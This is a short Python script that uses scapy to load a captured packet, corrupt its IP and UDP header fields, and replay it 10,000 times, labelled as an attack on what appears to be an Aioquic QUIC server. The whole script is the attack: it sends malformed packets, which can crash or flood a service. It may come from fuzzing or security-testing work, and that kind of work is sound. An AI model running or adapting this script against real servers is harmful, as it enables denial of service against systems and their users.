# Server : Aioquic
# Link : https://pgjones.dev/

from scapy.all import *

packetCollection = rdpcap("packet.pcapng")
packet = packetCollection[0]

# Changes applied

packet[IP].ihl = 10000      # Changed ihl variable in IP layer
packet[UDP].len = 10        # Reduced header length in UDP layer
packet[IP].id = 2120        # Changed IP's Id

packet.show()

# Attack starts

cnt=1

while cnt <= 10000:
    sendp(packet)
    cnt = cnt + 1
